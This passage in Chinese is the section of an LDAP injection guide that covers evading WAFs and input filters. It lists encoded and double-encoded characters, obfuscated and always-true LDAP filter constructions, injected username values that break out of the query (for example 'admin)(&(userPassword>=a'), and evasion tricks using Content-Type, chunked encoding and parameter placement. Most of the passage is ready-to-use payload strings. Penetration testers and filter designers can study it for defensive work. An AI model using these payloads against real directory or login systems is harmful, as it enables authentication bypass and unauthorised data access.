## 六、WAF与过滤器绕过

### 6.1 编码绕过
```
# URL编码（传输层解码后仍为原文注入）
( → %28   ) → %29   * → %2a   & → %26   | → %7c   ! → %21   = → %3d
# 双重URL编码（WAF解一次、应用又解一次的场景）
( → %2528
# Unicode/十六进制（部分框架/JVM层解码）
\u0028 → (    \x28 → (    %u0028 → (
# 等号右侧转义形式本身（\28）——若WAF按原文匹配字符则拦不住，但LDAP服务器会解码：
USER = \2a)  → 服务器解码为 *) → 注入
```

### 6.2 语法混淆
```
# 空格/空白（LDAP语法允许属性、运算符与括号间空白；值内空白有意义不可删）
( cn = admin )          → 部分实现容忍
(& (uid=admin) (userPassword=*) )
# 通配符变形（针对"拦截*"的规则）
cn=ad*in                → 前缀+后缀
cn=*dmi*                → 中缀
cn=*                    → 存在性
# 大小写混淆（针对"拦截(&(|"串的规则）
(&  →  &（LDAP运算符大小写不敏感，部分实现）
(uid=Admin) vs (uid=admin)  → 匹配规则差异（见1.2）
# 逻辑重构（不出现原始特征串的等价恒真）
恒真1: (|(cn=*)(!(cn=*)))
恒真2: (!(!(uid=*)))
恒真3: (&(uid=*)(|(objectClass=*)(objectClass=*)))
```

### 6.3 语义绕过（针对内容型WAF/应用层过滤）
```
# 若应用/网关拦截 *( 组合，改用单字符通配符不存在（LDAP无?），但可：
# ① 利用存在性属性
USER = admin)(&(description=*
# ② 用>= 代替子串
USER = admin)(&(userPassword>=a
# ③ 注入到属性名位置（6.2/1.3的上下文混淆）
attr = objectClass)(uid=admin  → (objectClass)(uid=admin)(=x)
# ④ 双参数污染（HPP）：username同时出现在两个字段，后端取拼接后者的值
```

### 6.4 传输层绕过
```
# Content-Type混淆（WAF按content-type决定是否解析body）
application/json; charset=utf-7
text/x-ldaprequest / application/ldap+json
# 分块传输
Transfer-Encoding: chunked
# 参数位置变换：GET query / POST form / multipart / JSON body 逐一尝试
# 加密通道：HTTPS终止后WAF无感知的纯内网面（若WAF部署位置在TLS之后则失效）
```

